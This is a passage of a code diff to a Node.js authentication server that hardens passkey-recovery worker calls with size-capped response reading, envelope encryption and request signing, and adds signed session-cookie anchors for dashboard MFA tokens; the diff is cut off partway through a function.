+// hard byte ceiling so a compromised upstream cannot exhaust Server 1 memory.
+const DIRAC_RECOVERY_WORKER_RESPONSE_MAX_BYTES_V200 = 128 * 1024;
+
+async function customerSecurityRecoveryWorkerReadResponseTextV200(response) {
+  if (!response || typeof response !== 'object') {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_RESPONSE_MISSING');
+  }
+
+  const contentLength = Number(response.headers && typeof response.headers.get === 'function'
+    ? response.headers.get('content-length')
+    : 0);
+  if (Number.isFinite(contentLength) && contentLength > DIRAC_RECOVERY_WORKER_RESPONSE_MAX_BYTES_V200) {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_RESPONSE_TOO_LARGE');
+  }
+
+  if (!response.body || typeof response.body.getReader !== 'function') {
+    const text = await response.text();
+    if (Buffer.byteLength(text, 'utf8') > DIRAC_RECOVERY_WORKER_RESPONSE_MAX_BYTES_V200) {
+      throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_RESPONSE_TOO_LARGE');
+    }
+    return text;
+  }
+
+  const reader = response.body.getReader();
+  const chunks = [];
+  let total = 0;
+  let joined = null;
+  try {
+    while (true) {
+      const part = await reader.read();
+      if (part.done) break;
+      const chunk = Buffer.from(part.value || Buffer.alloc(0));
+      total += chunk.length;
+      if (total > DIRAC_RECOVERY_WORKER_RESPONSE_MAX_BYTES_V200) {
+        chunk.fill(0);
+        try { await reader.cancel(); } catch (_) {}
+        throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_RESPONSE_TOO_LARGE');
+      }
+      chunks.push(chunk);
+    }
+    joined = Buffer.concat(chunks, total);
+    try {
+      return new TextDecoder('utf-8', { fatal: true }).decode(joined);
+    } catch (_) {
+      throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_RESPONSE_UTF8_INVALID');
+    }
+  } finally {
+    for (const chunk of chunks) chunk.fill(0);
+    if (joined) joined.fill(0);
+    try { reader.releaseLock(); } catch (_) {}
+  }
+}
+
 async function customerSecurityLostPasskeyArgon2Raw(input, salt, hashLength) {
   const argon2 = customerSecurityGetArgon2();
-  const memoryCost = Math.max(65536, Math.min(1048576, Number(process.env.DIRAC_LOST_PASSKEY_ARGON2_MEMORY_KIB || 655360)));
-  const timeCost = Math.max(3, Math.min(10, Number(process.env.DIRAC_LOST_PASSKEY_ARGON2_TIME_COST || 5)));
+  const memoryCost = 1048576;
+  const timeCost = 4;
   return Buffer.from(await argon2.hash(input, {
     type: argon2.argon2id,
     memoryCost,
     timeCost,
-    parallelism: 1,
+    parallelism: 4,
     hashLength: Math.max(32, Number(hashLength || 32)),
     salt: Buffer.from(salt),
     raw: true
@@ -6430,6 +8305,7 @@ function customerSecurityLostPasskeyBindings(req, owner) {
     customerBindingHash: customerSecurityLostPasskeyHashHex('customer-binding', customerId),
     authUserBindingHash: customerSecurityLostPasskeyHashHex('auth-user-binding', authUserId),
     deviceBindingHash: customerSecurityLostPasskeyHashHex('device-binding', deviceMaterial),
+    sessionHash: customerSecurityLostPasskeyWorkerHash(sessionHash),
     ipHash: customerSecurityLostPasskeyHashHex('ip', ip),
     userAgentHash: customerSecurityLostPasskeyHashHex('ua', ua)
   };
@@ -6457,9 +8333,18 @@ async function customerSecurityResolveLostPasskeyOwner(access) {
 }
 
 async function customerSecurityLostPasskeyActivePasskeys(owner) {
-  if (typeof diracPasskeyA2FListActivePasskeys !== 'function') return [];
-  const rows = await diracPasskeyA2FListActivePasskeys(owner).catch(() => []);
-  return (Array.isArray(rows) ? rows : []).filter((row) => row && row.is_active === true && diracPasskeyA2FOwnerMatches(row, owner));
+  if (typeof diracPasskeyA2FListActivePasskeys !== 'function') {
+    const error = new Error('PASSKEY_ACTIVE_STATE_READER_UNAVAILABLE');
+    error.statusCode = 503;
+    throw error;
+  }
+  const rows = await diracPasskeyA2FListActivePasskeys(owner);
+  if (!Array.isArray(rows)) {
+    const error = new Error('PASSKEY_ACTIVE_STATE_INVALID');
+    error.statusCode = 503;
+    throw error;
+  }
+  return rows.filter((row) => row && row.is_active === true && diracPasskeyA2FOwnerMatches(row, owner));
 }
 
 async function customerSecurityBuildLostPasskeyFile(input) {
@@ -6527,9 +8412,9 @@ async function customerSecurityBuildLostPasskeyFile(input) {
     created_at: input.createdAt,
     expires_at: input.expiresAt,
     kdf_params: {
-      memory_cost_kib: Math.max(65536, Math.min(1048576, Number(process.env.DIRAC_LOST_PASSKEY_ARGON2_MEMORY_KIB || 655360))),
-      time_cost: Math.max(3, Math.min(10, Number(process.env.DIRAC_LOST_PASSKEY_ARGON2_TIME_COST || 5))),
-      parallelism: 1,
+      memory_cost_kib: 1048576,
+      time_cost: 4,
+      parallelism: 4,
       hash_length: 32
     },
     salt: customerSecurityLostPasskeyB64(input.salt),
@@ -6743,7 +8628,7 @@ async function customerSecuritySendRecoveryEmailViaSmtp(to, fileName, fileBuffer
   let socket = null;
   try {
     const tls = require('tls');
-    socket = tls.connect({ host: config.host, port: config.port, servername: config.host, timeout: 20_000 });
+    socket = await diracCentralOpenSmtpSocketV230(config.host, config.port, true, 20_000);
     await customerSecuritySmtpCommand(socket, '', 220);
     await customerSecuritySmtpCommand(socket, 'EHLO diracgroup.store', 250);
     const auth = Buffer.from('\u0000' + config.user + '\u0000' + config.pass, 'utf8').toString('base64');
@@ -6831,13 +8716,21 @@ async function customerSecurityRecoveryCodesStatus(req, res, action) {
 async function customerSecurityGenerateRecoveryCodesViaWorker(req, res, action, access, owner, activePasskeys, bindings, pdfOptions = {}) {
   const workerEnvDiagnostics = customerSecurityRecoveryWorkerMainEnvDiagnostics();
   if (!workerEnvDiagnostics.ok) {
-    try { console.error('[recovery-worker-main-env-invalid]', JSON.stringify(workerEnvDiagnostics)); } catch (_) {}
-    return res.status(503).json({
+    try {
+      console.error('[recovery-worker-main-env-invalid]', JSON.stringify({
+        role: workerEnvDiagnostics.role,
+        missing_count: workerEnvDiagnostics.missing_env.length,
+        invalid_count: workerEnvDiagnostics.invalid_env.length,
+        wrong_server_count: workerEnvDiagnostics.wrong_server_env.length
+      }));
+    } catch (_) {}
+    const invalidEnvironmentBody = {
       ok: false,
       code: 'RECOVERY_WORKER_ENV_INVALID',
-      message: 'Konfigurasi recovery worker di Vercel 1 belum valid.',
-      worker_env: workerEnvDiagnostics
-    });
+      message: 'Konfigurasi recovery worker di Vercel 1 belum valid.'
+    };
+    if (!diracCentralIsProductionV146()) invalidEnvironmentBody.worker_env = workerEnvDiagnostics;
+    return res.status(503).json(invalidEnvironmentBody);
   }
 
   const workerUrl = customerSecurityRecoveryWorkerUrl();
@@ -6851,9 +8744,11 @@ async function customerSecurityGenerateRecoveryCodesViaWorker(req, res, action, 
     });
   }
 
-  const payload = {
+  const plaintextPayload = {
     action: DIRAC_RECOVERY_WORKER_ACTION,
     worker_action: DIRAC_RECOVERY_WORKER_TASK_GENERATE,
+    caller_id: caller,
+    nonce: crypto.randomBytes(32).toString('base64url'),
     auth_user_id: owner.authUserId,
     customer_id: owner.customerId,
     email: owner.email,
@@ -6861,14 +8756,28 @@ async function customerSecurityGenerateRecoveryCodesViaWorker(req, res, action, 
     customer_binding_hash: bindings.customerBindingHash,
     auth_user_binding_hash: bindings.authUserBindingHash,
     device_binding_hash: bindings.deviceBindingHash,
+    session_hash: bindings.sessionHash,
     ip_hash: bindings.ipHash,
     user_agent_hash: bindings.userAgentHash,
     active_passkey_count: Math.max(0, activePasskeys.length),
     requested_at: diracNowIso(),
-    account_password: String(pdfOptions.accountPassword || pdfOptions.account_password || '')
+    password_latest_material: String(pdfOptions.passwordLatestMaterial || pdfOptions.password_latest_material || pdfOptions.accountPassword || pdfOptions.account_password || '')
   };
-  const canonical = customerSecurityLostPasskeyCanonical(payload);
   const timestamp = String(Date.now());
+  let transportContext = null;
+  try {
+    transportContext = customerSecurityRecoveryWorkerSealV190(plaintextPayload, caller, timestamp);
+  } catch (_) {
+    return res.status(503).json({
+      ok: false,
+      code: 'RECOVERY_WORKER_TRANSPORT_CONFIGURATION_INVALID',
+      message: 'Enkripsi transport recovery belum dikonfigurasi dengan benar.'
+    });
+  } finally {
+    for (const key of Object.keys(plaintextPayload)) plaintextPayload[key] = null;
+  }
+  const payload = transportContext.envelope;
+  const canonical = customerSecurityLostPasskeyCanonical(payload);
   const signature = customerSecurityRecoveryWorkerSign(caller, timestamp, canonical);
   const target = new URL(workerUrl);
   target.searchParams.set('action', DIRAC_RECOVERY_WORKER_ACTION);
@@ -6886,14 +8795,25 @@ async function customerSecurityGenerateRecoveryCodesViaWorker(req, res, action, 
         'Accept': 'application/json',
         'X-Dirac-Worker-Caller': caller,
         'X-Dirac-Worker-Timestamp': timestamp,
-        'X-Dirac-Worker-Signature': signature
+        'X-Dirac-Worker-Signature': signature,
+        ...diracS2SSignHeadersV206({
+          target,
+          action: DIRAC_RECOVERY_WORKER_ACTION,
+          body: payload,
+          targetServerId: diracS2SIdV206(process.env.DIRAC_RECOVERY_WORKER_SERVER_ID)
+        })
       },
       body: JSON.stringify(payload),
+      redirect: 'error',
       signal: controller ? controller.signal : undefined
     });
-    const workerResponseText = await response.text().catch(() => '');
+    const workerResponseText = await customerSecurityRecoveryWorkerReadResponseTextV200(response);
     let data = {};
     try { data = workerResponseText ? JSON.parse(workerResponseText) : {}; } catch (_) { data = {}; }
+    if (!data || data.transport_encrypted !== true) {
+      throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_ENCRYPTED_RESPONSE_REQUIRED');
+    }
+    data = customerSecurityRecoveryWorkerOpenResponseV190(data, transportContext, response.status);
     if (!response.ok || !data || data.ok !== true) {
       const workerFailureBody = {
         ok: false,
@@ -6929,7 +8849,7 @@ async function customerSecurityGenerateRecoveryCodesViaWorker(req, res, action, 
     });
   } catch (error) {
     const workerErrorName = String(error && error.name || '').slice(0, 80);
-    const workerErrorMessage = String(error && error.message || '').slice(0, 240);
+    const workerErrorMessage = diracSecurityRedactDiagnosticV210(error, 240);
     try {
       console.error('[recovery-worker-unreachable]', JSON.stringify({
         name: workerErrorName,
@@ -6954,6 +8874,7 @@ async function customerSecurityGenerateRecoveryCodesViaWorker(req, res, action, 
     return res.status(502).json(unreachableBody);
   } finally {
     if (timer) clearTimeout(timer);
+    if (transportContext && transportContext.responseKey) transportContext.responseKey.fill(0);
   }
 }
 
@@ -6961,13 +8882,21 @@ async function customerSecurityGenerateRecoveryCodesViaWorker(req, res, action, 
 async function customerSecurityVerifyRecoveryCodeViaWorker(req, res, action, access, owner, activePasskeys, bindings, requestId, recoveryCode) {
   const workerEnvDiagnostics = customerSecurityRecoveryWorkerMainEnvDiagnostics();
   if (!workerEnvDiagnostics.ok) {
-    try { console.error('[recovery-worker-main-env-invalid]', JSON.stringify(workerEnvDiagnostics)); } catch (_) {}
-    return res.status(503).json({
+    try {
+      console.error('[recovery-worker-main-env-invalid]', JSON.stringify({
+        role: workerEnvDiagnostics.role,
+        missing_count: workerEnvDiagnostics.missing_env.length,
+        invalid_count: workerEnvDiagnostics.invalid_env.length,
+        wrong_server_count: workerEnvDiagnostics.wrong_server_env.length
+      }));
+    } catch (_) {}
+    const invalidEnvironmentBody = {
       ok: false,
       code: 'RECOVERY_WORKER_ENV_INVALID',
-      message: 'Konfigurasi recovery worker di Vercel 1 belum valid.',
-      worker_env: workerEnvDiagnostics
-    });
+      message: 'Konfigurasi recovery worker di Vercel 1 belum valid.'
+    };
+    if (!diracCentralIsProductionV146()) invalidEnvironmentBody.worker_env = workerEnvDiagnostics;
+    return res.status(503).json(invalidEnvironmentBody);
   }
 
   const workerUrl = customerSecurityRecoveryWorkerUrl();
@@ -6981,9 +8910,11 @@ async function customerSecurityVerifyRecoveryCodeViaWorker(req, res, action, acc
     });
   }
 
-  const payload = {
+  const plaintextPayload = {
     action: DIRAC_RECOVERY_WORKER_ACTION,
     worker_action: DIRAC_RECOVERY_WORKER_TASK_VERIFY,
+    caller_id: caller,
+    nonce: crypto.randomBytes(32).toString('base64url'),
     auth_user_id: owner.authUserId,
     customer_id: owner.customerId,
     email: owner.email,
@@ -6991,6 +8922,7 @@ async function customerSecurityVerifyRecoveryCodeViaWorker(req, res, action, acc
     customer_binding_hash: bindings.customerBindingHash,
     auth_user_binding_hash: bindings.authUserBindingHash,
     device_binding_hash: bindings.deviceBindingHash,
+    session_hash: bindings.sessionHash,
     ip_hash: bindings.ipHash,
     user_agent_hash: bindings.userAgentHash,
     active_passkey_count: Math.max(0, Array.isArray(activePasskeys) ? activePasskeys.length : 0),
@@ -6998,8 +8930,21 @@ async function customerSecurityVerifyRecoveryCodeViaWorker(req, res, action, acc
     recovery_code: String(recoveryCode || '')
   };
 
-  const canonical = customerSecurityLostPasskeyCanonical(payload);
   const timestamp = String(Date.now());
+  let transportContext = null;
+  try {
+    transportContext = customerSecurityRecoveryWorkerSealV190(plaintextPayload, caller, timestamp);
+  } catch (_) {
+    return res.status(503).json({
+      ok: false,
+      code: 'RECOVERY_WORKER_TRANSPORT_CONFIGURATION_INVALID',
+      message: 'Enkripsi transport recovery belum dikonfigurasi dengan benar.'
+    });
+  } finally {
+    for (const key of Object.keys(plaintextPayload)) plaintextPayload[key] = null;
+  }
+  const payload = transportContext.envelope;
+  const canonical = customerSecurityLostPasskeyCanonical(payload);
   const signature = customerSecurityRecoveryWorkerSign(caller, timestamp, canonical);
   const target = new URL(workerUrl);
   target.searchParams.set('action', DIRAC_RECOVERY_WORKER_ACTION);
@@ -7016,15 +8961,26 @@ async function customerSecurityVerifyRecoveryCodeViaWorker(req, res, action, acc
         'Accept': 'application/json',
         'X-Dirac-Worker-Caller': caller,
         'X-Dirac-Worker-Timestamp': timestamp,
-        'X-Dirac-Worker-Signature': signature
+        'X-Dirac-Worker-Signature': signature,
+        ...diracS2SSignHeadersV206({
+          target,
+          action: DIRAC_RECOVERY_WORKER_ACTION,
+          body: payload,
+          targetServerId: diracS2SIdV206(process.env.DIRAC_RECOVERY_WORKER_SERVER_ID)
+        })
       },
       body: JSON.stringify(payload),
+      redirect: 'error',
       signal: controller ? controller.signal : undefined
     });
 
-    const workerResponseText = await response.text().catch(() => '');
+    const workerResponseText = await customerSecurityRecoveryWorkerReadResponseTextV200(response);
     let data = {};
     try { data = workerResponseText ? JSON.parse(workerResponseText) : {}; } catch (_) { data = {}; }
+    if (!data || data.transport_encrypted !== true) {
+      throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_ENCRYPTED_RESPONSE_REQUIRED');
+    }
+    data = customerSecurityRecoveryWorkerOpenResponseV190(data, transportContext, response.status);
 
     if (!response.ok || !data || data.ok !== true) {
       const workerFailureBody = {
@@ -7052,7 +9008,7 @@ async function customerSecurityVerifyRecoveryCodeViaWorker(req, res, action, acc
     return res.status(200).json(data);
   } catch (error) {
     const workerErrorName = String(error && error.name || '').slice(0, 80);
-    const workerErrorMessage = String(error && error.message || '').slice(0, 240);
+    const workerErrorMessage = diracSecurityRedactDiagnosticV210(error, 240);
     try {
       console.error('[recovery-worker-verify-unreachable]', JSON.stringify({
         name: workerErrorName,
@@ -7077,6 +9033,7 @@ async function customerSecurityVerifyRecoveryCodeViaWorker(req, res, action, acc
     return res.status(502).json(unreachableBody);
   } finally {
     if (timer) clearTimeout(timer);
+    if (transportContext && transportContext.responseKey) transportContext.responseKey.fill(0);
   }
 }
 
@@ -7091,10 +9048,22 @@ async function customerSecurityGenerateRecoveryCodes(req, res, action, override 
   if (!access) return;
 
   const requestBody = localWorker ? {} : await readBody(req);
+  // SERVER 1 proxy-only boundary: use only the already-authenticated session identity.
+  // Official customer/link/passkey resolution is repeated authoritatively on Server 2.
   const owner = localWorker && override && override.owner
     ? override.owner
-    : await customerSecurityResolveLostPasskeyOwner(access);
-  if (!owner.ok) return res.status(owner.status || 403).json({ ok: false, message: owner.message || 'Recovery passkey tidak dapat dibuat.' });
+    : {
+        ok: true,
+        authUserId: String(access && access.authUserId || ''),
+        customerId: String(access && access.customerId || ''),
+        email: normalizeAuthEmail(access && access.user && access.user.email)
+      };
+  if (!owner.ok
+      || !customerSecurityLooksLikeUuid(owner.authUserId)
+      || !customerSecurityLooksLikeUuid(owner.customerId)
+      || !isValidAuthEmail(owner.email)) {
+    return res.status(401).json({ ok: false, message: 'Sesi recovery tidak valid.' });
+  }
 
   let recoveryPdfOptions = null;
 
@@ -7139,18 +9108,15 @@ async function customerSecurityGenerateRecoveryCodes(req, res, action, override 
         message: 'Password akun wajib diisi untuk membuat password PDF recovery.'
       });
     }
-    const verifiedPassword = await customerSecurityVerifyAccountPasswordForPdfV156(owner.email, accountPassword);
-    if (!verifiedPassword.ok) {
-      await customerSecurityRegisterFailedVerification(req, action, 'recovery_pdf_account_password_invalid', access.customerId);
-      return res.status(403).json({ ok: false, code: 'ACCOUNT_PASSWORD_INVALID', message: 'Password akun belum sesuai.' });
-    }
+    // Credential verification is intentionally performed only by Server 2.
+    // Server 1 seals this material inside the hybrid worker envelope and relays it.
     recoveryPdfOptions = { accountPassword };
   }
 
   const activePasskeys = localWorker && override && Array.isArray(override.activePasskeys)
     ? override.activePasskeys
-    : await customerSecurityLostPasskeyActivePasskeys(owner);
-  if (!activePasskeys.length) {
+    : [];
+  if (localWorker && !activePasskeys.length) {
     return res.status(409).json({ ok: false, code: 'ACTIVE_PASSKEY_NOT_FOUND', message: 'Passkey aktif untuk akun ini belum ditemukan. Gunakan flow pembuatan Passkey normal.' });
   }
 
@@ -7238,7 +9204,7 @@ async function customerSecurityGenerateRecoveryCodes(req, res, action, override 
       inner_encrypted_file_sha256: encrypted.fileSha256,
       passkey_count: activePasskeys.length,
       file_key_min_bytes: LOST_PASSKEY_RECOVERY_FILE_KEY_MIN_BYTES,
-      recovery_code_length: CUSTOMER_SECURITY_RECOVERY_CODE_LENGTH,
+      recovery_code_length: LOST_PASSKEY_RECOVERY_CODE_LENGTH_V157,
       salt_bytes: LOST_PASSKEY_RECOVERY_RANDOM_BYTES,
       dek_seed_bytes: LOST_PASSKEY_RECOVERY_RANDOM_BYTES
     }
@@ -7305,24 +9271,313 @@ async function customerSecurityGenerateRecoveryCodes(req, res, action, override 
    - Tidak membuat dashboard MFA/full login session.
    ============================================================ */
 
-function customerSecurityCreateDashboardMfaToken(req, user, method = 'recovery_code') {
+const DIRAC_CUSTOMER_MFA_STABLE_SESSION_BINDING_V225 = 'dirac-customer-mfa-stable-session-binding-v225';
+const DIRAC_CUSTOMER_MFA_AUTHORITATIVE_SESSION_BINDING_V226 = 'dirac-customer-mfa-authoritative-session-binding-v226';
+const DIRAC_CUSTOMER_MFA_SIGNED_SESSION_ANCHOR_V228 = 'dirac-customer-mfa-signed-session-anchor-v228';
+
+function customerSecurityDashboardMfaStableSessionBindingV225(req) {
+  let stableSession = '';
+  try {
+    stableSession = typeof diracCentralDeviceStableSessionBindingV222 === 'function'
+      ? String(diracCentralDeviceStableSessionBindingV222(req) || '').trim()
+      : '';
+  } catch (_) {}
+  if (!/^[a-f0-9]{64}$/.test(stableSession)) return '';
+  return customerMfaBindingHash('stable_session_v225', stableSession);
+}
+
+function customerSecurityDashboardMfaAuthoritativeSessionBindingV226(req) {
+  let authoritativeSession = '';
+  try {
+    authoritativeSession = typeof diracCentralReadVerifiedDeviceBindingV227 === 'function'
+      ? String(diracCentralReadVerifiedDeviceBindingV227(req) || '').trim()
+      : '';
+    if (!authoritativeSession && typeof diracCentralDeviceSessionBindingV222 === 'function') {
+      authoritativeSession = String(diracCentralDeviceSessionBindingV222(req) || '').trim();
+    }
+  } catch (_) {
+    authoritativeSession = '';
+  }
+  if (!/^[a-f0-9]{64}$/.test(authoritativeSession)) return '';
+  return customerMfaBindingHash('authoritative_session_v226', authoritativeSession);
+}
+
+
+function customerSecurityDecodeSignedSessionPayloadV228(value) {
+  const raw = String(value || '').trim();
+  const parts = raw.split('.');
+  if (parts.length !== 2 || !parts[0] || !parts[1]) return null;
+
+  const secret = getDomainSignedSessionSecret();
+  if (!secret) return null;
+  const expected = crypto.createHmac('sha256', secret).update(parts[0]).digest('base64url');
+  if (!safeEqual(parts[1], expected)) return null;
+
+  let payload;
+  try {
+    payload = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
+  } catch (_) {
+    return null;
+  }
+
+  const now = Math.floor(Date.now() / 1000);
+  const issuedAt = Number(payload && payload.iat || 0);
+  const expiresAt = Number(payload && payload.exp || 0);
+  const userId = String(payload && (payload.uid || payload.id) || '').trim();
+  const email = normalizeAuthEmail(payload && payload.email || '');
+  const sessionId = payload && payload.sid !== undefined
+    ? normalizeDomainSignedSessionId(payload.sid)
+    : '';
+
+  if (!payload || payload.typ !== DOMAIN_SIGNED_SESSION_TYPE
+      || !userId || !email
+      || !Number.isSafeInteger(issuedAt) || !Number.isSafeInteger(expiresAt)
+      || issuedAt > now + 60 || expiresAt <= now
+      || expiresAt - issuedAt <= 0 || expiresAt - issuedAt > 60 * 60 * 24 * 7 + 60
+      || (payload.sid !== undefined && !sessionId)) return null;
+
+  return { payload, userId, email, sessionId, issuedAt, expiresAt };
+}
+
+function customerSecurityDecodeSignedSessionAnchorV228(value) {
+  const decoded = customerSecurityDecodeSignedSessionPayloadV228(value);
+  if (!decoded) return null;
+
+  const now = Math.floor(Date.now() / 1000);
+  const anchorId = String(decoded.payload.mfa_bid_v228 || '').trim();
+  const anchorIssuedAt = Number(decoded.payload.mfa_iat_v228 || 0);
+  const anchorExpiresAt = Number(decoded.payload.mfa_exp_v228 || 0);
+  const securityEpoch = Number(decoded.payload.mfa_epoch_v235 || 0);
+
+  if (!/^[A-Za-z0-9_-]{43}$/.test(anchorId)
+      || !Number.isSafeInteger(anchorIssuedAt) || !Number.isSafeInteger(anchorExpiresAt)
+      || !Number.isSafeInteger(securityEpoch) || securityEpoch < 1
+      || anchorIssuedAt > now + 60 || anchorExpiresAt <= now
+      || anchorIssuedAt < decoded.issuedAt - 60
+      || anchorExpiresAt > decoded.expiresAt
+      || anchorExpiresAt - anchorIssuedAt <= 0
+      || anchorExpiresAt - anchorIssuedAt > 60 * 60 + 60) return null;
+
+  const binding = customerMfaBindingHash(
+    'signed_session_anchor_v228',
+    JSON.stringify([
+      DIRAC_CUSTOMER_MFA_SIGNED_SESSION_ANCHOR_V228,
+      decoded.userId,
+      decoded.email,
+      anchorId,
+      securityEpoch
+    ])
+  );
+  if (!/^[a-f0-9]{64}$/.test(binding)) return null;
+
+  return Object.assign({}, decoded, {
+    anchorId,
+    anchorIssuedAt,
+    anchorExpiresAt,
+    securityEpoch,
+    binding
+  });
+}
+
+function customerSecurityIssueSignedSessionAnchorV228(req, res, user, requestedMaxAgeSeconds, securityEpoch) {
+  const userId = String(user && user.id || '').trim();
+  const email = normalizeAuthEmail(user && user.email || '');
+  const epoch = Number(securityEpoch || 0);
+  if (!userId || !email || !res || !Number.isSafeInteger(epoch) || epoch < 1) return null;
+
+  const cookies = parseCookies(req);
+  const candidates = readCookieTokenCandidates(cookies, DOMAIN_SIGNED_SESSION_COOKIE).slice(0, 8);
+  const matching = candidates
+    .map(customerSecurityDecodeSignedSessionPayloadV228)
+    .filter((item) => item && item.userId === userId && item.email === email)
+    .sort((a, b) => b.expiresAt - a.expiresAt);
+
+  let verifiedBootstrapUser = null;
+  try {
+    verifiedBootstrapUser = typeof diracCentralReadVerifiedDeviceAuthV224 === 'function'
+      ? diracCentralReadVerifiedDeviceAuthV224(req)
+      : null;
+  } catch (_) {
+    verifiedBootstrapUser = null;
+  }
+  const bootstrapMatches = verifiedBootstrapUser
+    && String(verifiedBootstrapUser.id || '') === userId
+    && normalizeAuthEmail(verifiedBootstrapUser.email || '') === email;
+
+  if (!matching.length && !bootstrapMatches) return null;
+
+  const now = Math.floor(Date.now() / 1000);
+  const sessionMaxAge = typeof diracV110SessionMaxAgeSeconds === 'function'
+    ? Math.max(60, Math.min(60 * 60 * 24 * 7, Math.floor(Number(diracV110SessionMaxAgeSeconds()) || 0)))
+    : 60 * 60 * 24 * 7;
+  const signedExpiresAt = matching.length
+    ? Math.min(matching[0].expiresAt, now + sessionMaxAge)
+    : now + sessionMaxAge;
+  const requestedMaxAgeRaw = Math.floor(Number(requestedMaxAgeSeconds));
+  const requestedMaxAge = Number.isSafeInteger(requestedMaxAgeRaw)
+    ? Math.max(15 * 60, Math.min(60 * 60, requestedMaxAgeRaw))
+    : 30 * 60;
+  const anchorExpiresAt = Math.min(signedExpiresAt, now + requestedMaxAge);
+  const signedMaxAge = signedExpiresAt - now;
+  const anchorMaxAge = anchorExpiresAt - now;
+  if (signedMaxAge < 60 || anchorMaxAge < 1) return null;
+
+  const anchorId = crypto.randomBytes(32).toString('base64url');
+  const payload = {
+    typ: DOMAIN_SIGNED_SESSION_TYPE,
+    uid: userId,
+    email,
+    iat: now,
+    exp: signedExpiresAt,
+    nonce: crypto.randomBytes(12).toString('base64url'),
+    session_version: String(epoch),
+    mfa_bid_v228: anchorId,
+    mfa_iat_v228: now,
+    mfa_exp_v228: anchorExpiresAt,
+    mfa_epoch_v235: epoch
+  };
+  if (matching.length && matching[0].sessionId) payload.sid = matching[0].sessionId;
+
+  const value = signDomainSessionPayload(payload);
+  if (!value) return null;
+
+  const verifiedSignedSession = verifyDomainSessionCookieValue(value);
+  if (!verifiedSignedSession
+      || String(verifiedSignedSession.id || '') !== userId
+      || normalizeAuthEmail(verifiedSignedSession.email || '') !== email
+      || Number(verifiedSignedSession.exp || 0) !== signedExpiresAt
+      || (payload.sid !== undefined
+        && String(verifiedSignedSession.sessionId || '') !== String(payload.sid))) return null;
+  if (isEnvTrue('DOMAIN_SIGNED_SESSION_STRICT_VERSION')
+      && String(verifiedSignedSession.session_version || '') !== String(epoch)) return null;
+
+  const binding = customerMfaBindingHash(
+    'signed_session_anchor_v228',
+    JSON.stringify([
+      DIRAC_CUSTOMER_MFA_SIGNED_SESSION_ANCHOR_V228,
+      userId,
+      email,
+      anchorId,
+      epoch
+    ])
+  );
+  if (!/^[a-f0-9]{64}$/.test(binding)) return null;
+
+  const legacyDomainClears = getCompactCookieDomainsForSession()
+    .filter((domain) => Boolean(normalizeCookieDomain(domain)))
+    .map((domain) => makeCookie(DOMAIN_SIGNED_SESSION_COOKIE, '', {
+      maxAge: 0,
+      domain
+    }));
+  const anchoredSignedSessionCookie = makeCookie(DOMAIN_SIGNED_SESSION_COOKIE, value, {
+    maxAge: signedMaxAge,
+    domain: ''
+  });
+  if (!replaceResponseCookieByNameV229(res, DOMAIN_SIGNED_SESSION_COOKIE, [
+    ...legacyDomainClears,
+    anchoredSignedSessionCookie
+  ])) return null;
+
+  return {
+    binding,
+    signedSessionValue: value,
+    expiresAtMs: anchorExpiresAt * 1000,
+    maxAgeSeconds: anchorMaxAge
+  };
+}
+
+function customerSecuritySignedSessionAnchorMatchesV228(req, user, expectedBinding, expectedSecurityEpoch) {
+  const expected = String(expectedBinding || '').trim();
+  const userId = String(user && user.id || '').trim();
+  const email = normalizeAuthEmail(user && user.email || '');
+  const epoch = Number(expectedSecurityEpoch || 0);
+  if (!/^[a-f0-9]{64}$/.test(expected) || !userId || !email
+      || !Number.isSafeInteger(epoch) || epoch < 1) return false;
+
+  const cookies = parseCookies(req);
+  const candidates = readCookieTokenCandidates(cookies, DOMAIN_SIGNED_SESSION_COOKIE).slice(0, 8);
+  return candidates.some((value) => {
+    const decoded = customerSecurityDecodeSignedSessionAnchorV228(value);
+    return Boolean(decoded
+      && decoded.userId === userId
+      && decoded.email === email
+      && decoded.securityEpoch === epoch
+      && safeEqual(decoded.binding, expected));
+  });
+}
+
+function customerSecurityExpectedDashboardMfaSessionBindingV225(req, payload) {
+  const rawVersion = payload && payload.sessionBindingVersion;
+  const version = rawVersion === undefined || rawVersion === null || rawVersion === ''
+    ? 1
+    : Number(rawVersion);
+  if (!Number.isSafeInteger(version)) return '';
+  if (version === 3) return customerSecurityDashboardMfaAuthoritativeSessionBindingV226(req);
+  if (version === 2) return customerSecurityDashboardMfaStableSessionBindingV225(req);
+  if (version !== 1) return '';
+
+  let legacySessionHash = '';
+  try {
+    legacySessionHash = typeof diracCentralRequestSessionHashV146 === 'function'
+      ? String(diracCentralRequestSessionHashV146(req) || '').trim()
+      : '';
+  } catch (_) {}
+  return /^[a-f0-9]{64}$/.test(legacySessionHash) ? legacySessionHash : '';
+}
+
+function customerSecurityCreateDashboardMfaToken(req, user, method = 'recovery_code', res = null, context = {}) {
   const email = normalizeAuthEmail(user && user.email);
   const now = Date.now();
-  const maxAgeSeconds = Math.max(15 * 60, Math.min(60 * 60, Number(process.env.DIRAC_DASHBOARD_MFA_MAX_AGE_SECONDS || 30 * 60)));
+  const configuredMaxAgeSeconds = Number(process.env.DIRAC_DASHBOARD_MFA_MAX_AGE_SECONDS || 30 * 60);
+  const requestedMaxAgeSeconds = Number.isFinite(configuredMaxAgeSeconds)
+    ? Math.max(15 * 60, Math.min(60 * 60, configuredMaxAgeSeconds))
+    : 30 * 60;
   const userId = String(user && user.id || '').trim();
-  const customerId = String(user && (user.customer_id || user.customerId || user.customer || '') || '').trim();
-  let sessionHash = '';
-  try { sessionHash = typeof diracCentralRequestSessionHashV146 === 'function' ? diracCentralRequestSessionHashV146(req) : ''; } catch (_) {}
+  const customerId = String(
+    context && context.customerId
+      || user && (user.customer_id || user.customerId || user.customer || '')
+      || ''
+  ).trim();
+  const securityEpoch = Number(context && context.securityEpoch || 0);
+  if (!customerSecurityLooksLikeUuid(customerId)
+      || !Number.isSafeInteger(securityEpoch) || securityEpoch < 1) {
+    return {
+      token: '',
+      expiresAtMs: 0,
+      activeAtMs: 0,
+      maxAgeSeconds: 0,
+      error: 'MFA_SECURITY_EPOCH_UNAVAILABLE'
+    };
+  }
